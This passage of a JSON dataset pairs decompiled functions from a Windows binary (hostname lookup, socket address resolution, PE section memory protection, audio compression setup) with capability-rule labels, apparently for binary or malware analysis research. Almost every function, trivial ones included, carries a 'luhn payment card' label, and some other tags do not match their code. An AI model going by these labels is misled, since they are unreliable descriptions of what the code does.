        "decompiled_code": "\nvoid __fastcall fcn.004606cc(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405530();\n    if (param_2 == NULL) {\n        fcn.00405584();\n    }\n    else if (*param_2 - 0x30U < 10) {\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.wsock32.dll_inet_addr(uVar1);\n        if (iVar2 != -1) {\n            fcn.00405584();\n        }\n    }\n    else {\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar2 != 0) {\n            fcn.0040af98(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "004607e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.004607e0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar auStack264 [256];\n    \n    fcn.00405530();\n    sub.wsock32.dll_gethostname(auStack264, 0x100);\n    iVar1 = (**(*in_EAX + 0x38))();\n    if (iVar1 == 0) {\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0046087c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046087c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004605c8();\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x88) = 0;\n    *(in_EAX + 0x8c) = 0;\n    *(in_EAX + 0x90) = 0;\n    *(in_EAX + 0x94) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 209
    },
    "00461a98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461a98(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack28 = 0x461ab3;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack32 = 0x461b5f;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x461b33;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h = &fcn.00461a98::var_8h;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040ef44(arg_8h, *0x461b70);\n    fcn.004055c8();\n    sub.user32.dll_ShowWindow();\n    sub.user32.dll_SetForegroundWindow();\n    iVar2 = 1;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if (iVar1 < iVar2) break;\n        fcn.004619e4();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = arg_8h;\n    iStack48 = 0x461b66;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 416
    },
    "00461f6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00461f6c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46205f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x461f95;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar1;\n    uStack36 = 0x46203f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00461d10();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x462049;\n    uStack36 = 0x461fc9;\n    iVar2 = (**(**(in_EAX + 0x4c) + 0x14))();\n    if (iVar2 < 1) {\n        uStack36 = 0x461fdd;\n        (**(**(in_EAX + 0x4c) + 0x38))();\n    }\n    uStack36 = 0x461feb;\n    iVar2 = fcn.0041fa34();\n    *(iVar2 + 0xf) = 1;\n    uStack36 = 0x461ffa;\n    fcn.0041fc40();\n    uStack36 = 0x462007;\n    fcn.004894c0();\n    uStack36 = 0x462015;\n    (**(**(in_EAX + 0x4c) + 0x1c))();\n    uStack36 = 0x46201f;\n    fcn.00489470();\n    uStack36 = 0x46202c;\n    fcn.004894bc();\n    uStack36 = 0x462033;\n    fcn.0041fef0();\n    uStack36 = 0x46203e;\n    fcn.0040f944();\n    return;\n}\n",
        "token_count": 532
    },
    "004621dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004621dc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 144
    },
    "00463a9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463a9c(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint var_90h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack164 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack168 = 0x463b65;\n    uStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    if ((-1 < param_2) && (iVar2 = fcn.0040676c(),  param_2 < iVar2)) {\n        uVar1 = *(*(in_EAX + 0x50) + 0xc + param_2 * 0x18);\n        (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n        uVar3 = fcn.004637ac();\n        if ((uVar3 & 0x80000000) == 0) {\n            var_ch = 0;\n            var_10h = 0;\n            (**(*var_4h + 0x14))(var_4h, &fcn.00463a9c::var_ch, &fcn.00463a9c::var_10h);\n            uVar3 = (**(*var_4h + 0x18))(var_4h, uVar1, &fcn.00463a9c::var_8h, &fcn.00463a9c::var_90h);\n            if ((uVar3 & 0x80000000) == 0) {\n                (**(*var_4h + 0xc))(var_4h, var_8h);\n            }\n        }\n        (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n    }\n    *in_FS_OFFSET = uStack172;\n    puStack164 = 0x463b6c;\n    uStack168 = 0x463b64;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 527
    },
    "00463b78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463b78(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_EDX;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack1332;\n    uint uStack1328;\n    uchar *puStack1324;\n    uint var_518h;\n    uint var_4c0h;\n    uint var_48ch;\n    uint32_t var_488h;\n    uint var_480h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    puStack1324 = 0x463b9e;\n    fcn.00405fe8();\n    uStack1328 = 0x463cb0;\n    piStack1332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffacc;\n    *in_EDX = 0;\n    *var_50h = 0;\n    puStack1324 = &stack0xfffffffc;\n    (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n    (**(**(in_EAX + 0x38) + 0x10))(*(in_EAX + 0x38));\n    iVar3 = fcn.004637ac();\n    if (iVar3 == 0) {\n        (**(*var_4h + 0x10))(var_4h, &fcn.00463b78::var_54h);\n        fcn.00406208();\n        cVar2 = fcn.004628b8();\n        if (cVar2 != '\\0') {\n            fcn.00403af4();\n            puVar4 = *(var_54h + 0x44);\n            puVar5 = &fcn.00463b78::var_518h;\n            for (iVar3 = 0x16; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.004030fc();\n            *in_EDX = var_48ch;\n            *var_50h = (var_488h ^ var_488h >> 0x1f) - (var_488h >> 0x1f);\n            *arg_8h = var_480h;\n        }\n    }\n    (**(**(in_EAX + 0x38) + 0x18))(*(in_EAX + 0x38), 0, 0);\n    piVar1 = *(in_EAX + 0xc);\n    (**(*piVar1 + 0x1c))();\n    *in_FS_OFFSET = piVar1;\n    fcn.004060ac(0x463cb7);\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 698
    },
    "00463cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463cec(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_5h;\n    \n    puStack28 = 0x463cfa;\n    iVar1 = fcn.00404a1c();\n    uStack32 = 0x463d7f;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack40 = 0x463d18;\n    puStack28 = &stack0xfffffffc;\n    fcn.00463778();\n    piStack40 = *(iVar1 + 0xc);\n    piStack44 = 0x463d24;\n    (**(*piStack40 + 0x24))();\n    piStack44 = *(iVar1 + 0x38);\n    piStack48 = 0x463d30;\n    (**(*piStack44 + 0x10))();\n    piStack48 = 0x463d38;\n    fcn.00463700();\n    piStack48 = 0x463d40;\n    fcn.00463718();\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x463d86;\n    piStack44 = 0x463d74;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piStack40 = &stack0xfffffffc;\n    fcn.00404640();\n    *in_FS_OFFSET = piStack48;\n    return;\n}\n",
        "token_count": 382
    },
    "00464188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00464188(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004640a0();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "00464238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00464238(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x464250;\n    fcn.0042ee30();\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    puStack24 = 0x464266;\n    fcn.00405530();\n    if (*(in_EAX + 4) != 0) {\n        uStack28 = 0x464295;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00404650();\n        *(in_EAX + 4) = 0;\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x4642a7;\n        fcn.00464020();\n        *(in_EAX + 9) = 0;\n    }\n    return;\n}\n",
        "token_count": 253
    },
    "00464de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00464de0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *0x499f44 = fcn.00464188();\n    fcn.00464d04();\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 5) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 182
    },
    "00464f98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00464f98(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x465082;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x464fc6;\n    piVar1 = fcn.00404620();\n    puStack52 = 0x464fd5;\n    fcn.00464188();\n    uStack56 = 0x46505d;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00464228();\n    fcn.00405530();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))(0);\n            uStack56 = 0;\n            uStack60 = 0x465098;\n            fcn.004058e0();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405584();\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x465064;\n    uStack56 = 0x465054;\n    fcn.00404650();\n    uStack56 = 0x46505c;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 424
    },
    "00465284": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465284(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 53
    },
    "004652b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004652b4(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return in_EAX + arg_8h;\n}\n",
        "token_count": 98
    },
    "004652f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004652f8(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return param_2 + in_EAX;\n}\n",
        "token_count": 97
    },
    "00465350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00465350(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00465348();\n    return CONCAT44(CARRY4(arg_8h, uVar1) + CARRY4(*(arg_8h + 0x14), arg_8h + uVar1), *(arg_8h + 0x14) + arg_8h + uVar1)\n    ;\n}\n",
        "token_count": 104
    },
    "004658f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004658f4(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint lpflOldProtect;\n    int32_t var_4h;\n    \n    var_4h = fcn.00465350(*arg_8h);\n    uVar4 = *(*arg_8h + 6);\n    if (-1 < uVar4 - 1) {\n        do {\n            if ((*(var_4h + 0x27) & 2) == 0) {\n                uVar2 = fcn.0046587c(*(var_4h + 0x24));\n                uVar1 = *(var_4h + 0x24);\n                if ((uVar1 & 0x4000000) != 0) {\n                    uVar2 = uVar2 | 0x200;\n                }\n                iVar3 = *(var_4h + 0x10);\n                if (iVar3 == 0) {\n                    if ((uVar1 & 0x40) == 0) {\n                        if ((uVar1 & 0x80) != 0) {\n                            iVar3 = *(*arg_8h + 0x24);\n                        }\n                    }\n                    else {\n                        iVar3 = *(*arg_8h + 0x20);\n                    }\n                    if ((iVar3 != 0) &&\n                       (iVar3 = sub.kernel32.dll_VirtualProtect(*(var_4h + 8), *(var_4h + 0x10), uVar2, &lpflOldProtect)\n                       ,  iVar3 == 0)) {\n                        fcn.00405584();\n                        return;\n                    }\n                }\n                fcn.00465284(0x28, 0);\n            }\n            else {\n                sub.kernel32.dll_VirtualFree_1(*(var_4h + 8), *(var_4h + 0x10), 0x4000);\n                fcn.0046529c(0x28, 0);\n            }\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    return;\n}\n",
        "token_count": 492
    },
    "00466204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466204(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.00466268();\n    }\n    iVar1 = fcn.0046626c();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "004662e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004662e4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.00466268();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f34();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "0046631c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046631c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00466268();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.004662e4();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403af4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.00466204();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 244
    },
    "004664d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004664d0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0x104) = 0;\n    fcn.00466740();\n    *(in_EAX + 0x15c) = 1;\n    *(in_EAX + 0x15e) = 1;\n    *(in_EAX + 0x160) = 0x5622;\n    *(in_EAX + 0x164) = 0x5622;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x16a) = 8;\n    *(in_EAX + 0x16c) = 0x81;\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1df) = 1;\n    *(in_EAX + 0x1e1) = 0x5622;\n    *(in_EAX + 0x1e5) = 0x5622;\n    *(in_EAX + 0x1e9) = 1;\n    *(in_EAX + 0x1eb) = 8;\n    *(in_EAX + 0x1ed) = 0x81;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 395
    },
    "004665ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004665ac(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(arg_8h + -4);\n    *(iVar1 + 0x108) = 0x54;\n    *(iVar1 + 0x10c) = 0;\n    *(iVar1 + 0x110) = 0;\n    *(iVar1 + 0x114) = *(*(arg_8h + -4) + 0xf0);\n    *(iVar1 + 0x118) = *(*(arg_8h + -4) + 0xf8);\n    *(iVar1 + 0x11c) = 0;\n    *(iVar1 + 0x120) = 0;\n    *(iVar1 + 0x124) = *(*(arg_8h + -4) + 0xf4);\n    *(iVar1 + 0x128) = *(*(arg_8h + -4) + 0xfc);\n    *(iVar1 + 300) = 0;\n    *(iVar1 + 0x130) = 0;\n    return;\n}\n",
        "token_count": 251
    },
    "0046661c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046661c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    *(in_EAX + 0x100) = 1;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    iStack40 = in_EAX + 0x1dd;\n    iStack44 = in_EAX + 0x15c;\n    uStack48 = 0;\n    iStack52 = in_EAX + 0x104;\n    uStack56 = 0x46665a;\n    sub.msacm32.dll_acmStreamOpen();\n    uStack56 = 0;\n    iStack60 = in_EAX + 0xfc;\n    uStack64 = *(in_EAX + 0xf8);\n    uStack68 = *(in_EAX + 0x104);\n    puStack72 = 0x46667e;\n    sub.msacm32.dll_acmStreamSize();\n    puStack72 = 0x46668c;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 0xf0) = uVar1;\n    puStack72 = 0x4666a3;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 0xf4) = uVar1;\n    uStack76 = 0x4666e5;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.004665ac(&stack0xfffffffc);\n    uVar1 = *(in_EAX + 0x104);\n    sub.msacm32.dll_acmStreamPrepareHeader(uVar1, in_EAX + 0x108, 0);\n    *in_FS_OFFSET = uVar1;\n    *(in_EAX + 0xec) = 1;\n    return;\n}\n",
        "token_count": 552
    },
    "004667b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004667b4(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 67
    },
    "00466964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00466964(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0xc) = 0x2000;\n    *(in_EAX + 0x94) = 0;\n    uVar2 = 0x466bc8;\n    uVar1 = fcn.00466888(0x466bc8, in_EAX);\n    *(in_EAX + 0x98) = uVar1;\n    *(in_EAX + 0x91) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 273
    },
    "0046879c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0046879c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = *(in_EAX + 0x28) * 2;\n    *(*(in_EAX + 0x40) + -2 + *(in_EAX + 0x48) * 2) = 0;\n    fcn.004676bc(*(in_EAX + 0x40), 0, (*(in_EAX + 0x48) + -1) * 2);\n    *(in_EAX + 0x7c) = *(*(in_EAX + 0x80) * 0xc + 0x492b22);\n    *(in_EAX + 0x88) = *(*(in_EAX + 0x80) * 0xc + 0x492b20);\n    *(in_EAX + 0x8c) = *(*(in_EAX + 0x80) * 0xc + 0x492b24);\n    *(in_EAX + 0x78) = *(*(in_EAX + 0x80) * 0xc + 0x492b26);\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x70) = 0;\n    *(in_EAX + 0x74) = 2;\n    *(in_EAX + 0x5c) = 2;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x44) = 0;\n    return;\n}\n",
        "token_count": 369
    },
    "0046b2a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046b2a0(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    puVar1 = in_EAX + 0x90;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x11e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0x984;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x1e);\n    iVar2 = 0;\n    puVar1 = in_EAX + 0xa78;\n    do {\n        *puVar1 = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 2;\n    } while (iVar2 < 0x13);\n    *(in_EAX + 0x490) = 1;\n    *(in_EAX + 0x16a8) = 0;\n    *(in_EAX + 0x16a4) = 0;\n    *(in_EAX + 0x16ac) = 0;\n    *(in_EAX + 0x169c) = 0;\n    return;\n}\n",
        "token_count": 325
    },
    "0046b30c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
